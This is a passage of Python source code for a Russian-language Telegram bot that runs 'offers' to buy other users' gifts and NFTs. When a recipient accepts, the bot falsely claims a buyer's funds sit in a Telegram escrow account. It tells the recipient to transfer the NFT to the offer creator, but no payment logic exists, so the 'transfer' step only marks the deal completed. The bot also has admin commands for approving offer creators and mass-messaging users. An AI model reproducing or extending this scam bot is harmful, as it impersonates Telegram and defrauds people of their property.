    "✖️": "5778527486270770928",
}


def e(text: str) -> str:
    for k in sorted(EMOJI_MAP, key=len, reverse=True):
        text = text.replace(k, f'<tg-emoji emoji-id="{EMOJI_MAP[k]}">{k}</tg-emoji>')
    return text


CURRENCY_NAMES = {"⭐": "Star", "🪓": "Rub", "🔷": "Gram", "💲": "Dollar"}

storage = MemoryStorage()
bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

verified_handles: set = set()
started_users: set = set()
username_to_id: dict = {}
offers: dict = {}
pending_offers: dict = {}


class OfferFlow(StatesGroup):
    username = State()
    link = State()
    currency = State()
    amount = State()
    confirm = State()


def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer")],
        [InlineKeyboardButton(text="⬅️ Выйти", callback_data="exit_main")],
    ])


def back_kb(target):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"back:{target}")],
    ])


def currency_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Star", callback_data="cur:⭐"),
         InlineKeyboardButton(text="🪓 Rub", callback_data="cur:🪓")],
        [InlineKeyboardButton(text="🔷 Gram", callback_data="cur:🔷"),
         InlineKeyboardButton(text="💲 Dollar", callback_data="cur:💲")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back:link")],
    ])


def confirm_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Подтвердить оффер", callback_data="confirm_offer")],
    ])


def gen_id(n=8):
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n))


WELCOME = ("✈️ Добро пожаловать!\n\n"
           "Создавайте офферы, отправляйте предложения другим пользователям и отслеживайте сделки\n\n"
           "После сделок с вами связывается администратор и выдает деньги с оффера")

T_USERNAME = "🐶 Пришлите @username человека которому вы хотите сделать оффер. Если человек не пользуется ботом — оффер прийдёт сразу после старта бота."
T_LINK = "🗓️ Пришлите ссылку на подарок / подарки (если несколько — запишите в столбик)"
T_CURRENCY = "❓ В какой валюте проводим сделку"
T_AMOUNT = "👛 Укажите сумму сделки. Убедитесь, что она соответствует вашим возможностям и лимитам по выбранной валюте"
T_CONFIRM = "✈️ Оффер готов к отправке, чтобы отправить нажмите кнопку ниже. Если вы не готовы или передумали — не нажимайте"


async def send_offer_to_recipient(bot_instance, recipient_id, offer_id):
    o = offers[offer_id]
    text = f"Пользователь предлагает вам {o['amount']} {o['currency']} за подарок {o['link']}"
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✖️ Отклонить", callback_data=f"reject:{offer_id}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
    ]])
    await bot_instance.send_message(recipient_id, e(text), reply_markup=kb)


@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    started_users.add(message.from_user.id)
    if message.from_user.username:
        username_to_id[message.from_user.username.lower()] = message.from_user.id

    await message.answer(e("🔷"))
    await message.answer(e(WELCOME), reply_markup=main_menu_kb())

    if message.from_user.username:
        u = message.from_user.username.lower()
        if u in pending_offers:
            for oid in list(pending_offers[u]):
                if oid in offers and offers[oid]["status"] == "pending":
                    await send_offer_to_recipient(bot, message.from_user.id, oid)
            pending_offers.pop(u, None)


@dp.message(Command("dostup"))
async def cmd_dostup(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /dostup @username")
        return
    uname = parts[1].strip().lstrip("@").lower()
    verified_handles.add(uname)
    await message.answer(f"Доступ выдан @{uname}")


@dp.message(Command("undostup"))
async def cmd_undostup(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /undostup @username")
        return
    uname = parts[1].strip().lstrip("@").lower()
    verified_handles.discard(uname)
    await message.answer(f"Доступ снят с @{uname}")


@dp.message(Command("m"))
async def cmd_m(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /m текст")
        return
    txt = parts[1]
    sent = 0
    for uid in list(started_users):
        try:
            await message.bot.send_message(uid, txt, parse_mode=None)
            sent += 1
        except Exception:
            pass
    await message.answer(f"Отправлено: {sent}")


@dp.message(Command("offers"))
async def cmd_offers(message: Message):
    if message.from_user.id not in ADMINS:
        return
    active = {k: v for k, v in offers.items() if v["status"] == "pending"}
    if not active:
        await message.answer("Активных офферов нет")
        return
    lines = ["Активные офферы:"]
    for oid, o in active.items():
        lines.append(f"#{oid} | @{o['creator_username']} → {o['recipient']} | {o['amount']} {o['currency']}")
    await message.answer("\n".join(lines))


@dp.callback_query(F.data == "create_offer")
async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id not in ADMINS:
        uname = (cb.from_user.username or "").lower()
        if uname not in verified_handles:
            await cb.answer(
                "Вы ещё не верифицированы для создания оффера! Заявка на верификацию отправлена",
                show_alert=True,
            )
            for admin_id in ADMINS:
                try:
                    await cb.bot.send_message(
                        admin_id,
                        f"Пользователь @{cb.from_user.username or cb.from_user.id} "
                        f"(ID: {cb.from_user.id}) запрашивает доступ к созданию офферов.",
                    )
                except Exception:
                    pass
            return
    await state.set_state(OfferFlow.username)
    await cb.message.edit_text(e(T_USERNAME), reply_markup=back_kb("main"))
    await cb.answer()


@dp.callback_query(F.data == "exit_main")
async def cb_exit_main(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    try:
        await cb.message.delete()
    except Exception:
        pass
    await cb.answer()


@dp.callback_query(F.data.startswith("back:"))
async def cb_back(cb: CallbackQuery, state: FSMContext):
    t = cb.data.split(":", 1)[1]
    if t == "main":
        await state.clear()
        await cb.message.edit_text(e(WELCOME), reply_markup=main_menu_kb())
    elif t == "username":
        await state.set_state(OfferFlow.username)
        await cb.message.edit_text(e(T_USERNAME), reply_markup=back_kb("main"))
    elif t == "link":
        await state.set_state(OfferFlow.link)
        await cb.message.edit_text(e(T_LINK), reply_markup=back_kb("username"))
    elif t == "currency":
        await state.set_state(OfferFlow.currency)
        await cb.message.edit_text(e(T_CURRENCY), reply_markup=currency_kb())
    elif t == "amount":
        await state.set_state(OfferFlow.amount)
        await cb.message.edit_text(e(T_AMOUNT), reply_markup=back_kb("currency"))
    await cb.answer()


@dp.callback_query(F.data.startswith("cur:"))
async def cb_currency(cb: CallbackQuery, state: FSMContext):
    cur = cb.data.split(":", 1)[1]
    await state.update_data(currency=cur)
    await state.set_state(OfferFlow.amount)
    await cb.message.edit_text(e(T_AMOUNT), reply_markup=back_kb("currency"))
    await cb.answer()


@dp.callback_query(F.data == "confirm_offer")
async def cb_confirm(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if (not data or "amount" not in data or "recipient" not in data
            or "link" not in data or "currency" not in data):
        await cb.answer()
        return
    await state.clear()

    oid = gen_id()
    offer = {
        "id": oid,
        "creator_id": cb.from_user.id,
        "creator_username": cb.from_user.username or str(cb.from_user.id),
        "recipient": data["recipient"],
        "link": data["link"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "pending",
    }
    offers[oid] = offer

    ru = data["recipient"].lstrip("@").lower()
    rid = username_to_id.get(ru)
    if rid:
        await send_offer_to_recipient(cb.bot, rid, oid)
    else:
        pending_offers.setdefault(ru, []).append(oid)

    notify = (f"✈️ @{offer['creator_username']} (🔶 уровень в боте), вы успешно отправили оффер "
              f"на сумму {offer['amount']} {offer['currency']} пользователю {data['recipient']}.\n\n"
              f"👀 Если пользователь ещё не заходил в бота, он может нажать старт "
              f"и оффер автоматически отправится.")
    try:
        await cb.bot.send_message(cb.from_user.id, e(notify))
    except Exception:
        pass

    await cb.message.edit_text(e(WELCOME), reply_markup=main_menu_kb())
    await cb.answer()


@dp.message(OfferFlow.username)
async def msg_username(message: Message, state: FSMContext):
    txt = (message.text or "").strip()
    if not txt.startswith("@") or len(txt) < 2:
        await message.answer("Пришлите @username")
        return
    await state.update_data(recipient=txt)
    await state.set_state(OfferFlow.link)
    await message.answer(e(T_LINK), reply_markup=back_kb("username"))


@dp.message(OfferFlow.link)
async def msg_link(message: Message, state: FSMContext):
    await state.update_data(link=(message.text or "").strip())
    await state.set_state(OfferFlow.currency)
    await message.answer(e(T_CURRENCY), reply_markup=currency_kb())


@dp.message(OfferFlow.amount)
async def msg_amount(message: Message, state: FSMContext):
    txt = (message.text or "").strip()
    if not txt.isdigit():
        await message.answer("Введите целое число")
        return
    await state.update_data(amount=int(txt))
    await state.set_state(OfferFlow.confirm)
    await message.answer(e(T_CONFIRM), reply_markup=confirm_kb())


@dp.callback_query(F.data.startswith("reject:"))
async def cb_reject(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    if oid in offers:
        offers[oid]["status"] = "rejected"
        del offers[oid]
    try:
        await cb.message.delete()
    except Exception:
        pass
    await cb.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    if oid not in offers:
        await cb.answer()
        return
    o = offers[oid]

    await cb.answer(
        "Внимание!\n\n"
        "Следуйте инструкциям, чтобы не потерять свой подарок и получить оплату.\n\n"
        "Нажмите ОК, если вы прочитали это предупреждение.",
        show_alert=True,
    )

    trade_id = gen_id()
    cname = CURRENCY_NAMES.get(o["currency"], "")

    text = (
        f"Сделка по NFT Заказ #{trade_id}\n\n"
        f"Покупатель зарезервировал {o['amount']} {o['currency']} GRAM через систему "
        f"эскроу (безопасной сделки) Telegram. Средства хранятся на специальном "
        f"эскроу-счете и будут автоматически зачислены на ваш баланс {cname} сразу "
        f"после передачи подарка.\n\n"
        f"Инструкции для завершения сделки:\n\n"
        f"Передайте подарок пользователю: @{o['creator_username']}\n\n"
        f"Нажмите «Transfer NFT» и выберите {o['link']}\n\n"
        f"Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и мгновенно зачислит {o['amount']} "
        f"{o['currency']} на ваш баланс. Бронь действительна в течение 24 часов."
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"transfer:{oid}"),
    ]])
    await cb.message.edit_text(e(text), reply_markup=kb)


@dp.callback_query(F.data.startswith("transfer:"))
async def cb_transfer(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    if oid in offers:
        offers[oid]["status"] = "completed"
    await cb.message.edit_text(
        e("👛 Оплата начислиться если вы передали подарок. Спасибо за окончание сделки!")
    )
    await cb.answer()


@dp.message()
async def track_user(message: Message):
    if message.from_user and message.from_user.username:
        username_to_id[message.from_user.username.lower()] = message.from_user.id


async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
